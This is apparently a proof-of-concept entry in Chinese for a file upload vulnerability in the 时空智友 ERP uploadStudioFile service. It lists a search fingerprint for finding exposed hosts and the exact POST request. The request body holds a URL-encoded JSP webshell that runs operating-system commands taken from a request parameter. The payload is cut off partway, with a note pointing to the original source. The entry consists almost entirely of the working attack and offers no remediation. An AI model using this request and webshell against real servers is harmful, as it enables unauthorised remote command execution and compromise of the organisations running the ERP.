# 时空智友ERPuploadstudiofile文件上传漏洞

- **系统**：时空智友ERPuploadstudiofile　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`body="[login.jsp?login=null](http://login.jsp?login=null"`
- **请求**：`POST /formservice?service=updater.uploadStudioFile HTTP/1.1`
- **关键头**：`Content-Length: 1098`　`Content-Type: application/x-www-form-urlencoded`

**请求体 / payload**
```
content=<?xml%20version="1.0"?><root><filename>test.jsp</filename><filepath>./</filepath><filesize>172</filesize><lmtime>1970-01-01%2008:00:00</lmtime></root><!--%3c%25%20%6a%61%76%61%2e%69%6f%2e%49%6e%70%75%74%53%74%72%65%61%6d%20%69%6e%20%3d%20%52%75%6e%74%69%6d%65%2e%67%65%74%52%75%6e%74%69%6d%65%28%29%2e%65%78%65%63%28%72%65%71%75%65%73%74%2e%67%65%74%50%61%72%61%6d%65%74%65%72%28%22%63%22%29%29%2e%67%65%74%49%6e%70%75%74%53%74%72%65%61%6d%28%29%3b%69%6e%74%20%61%20%3d%20%2d%31%3b%62%79%74%65%5b%5d%20%62%20%3d%20%6e%65%77%20%62%79%74%65%5b%32%30%34%38%5d%3b%6f%75%74%2e%70%72%69%6e%74%28%22…（脚本共 1222 字，完整版见原文）
```
- **预期**：200　|　<!--<pre>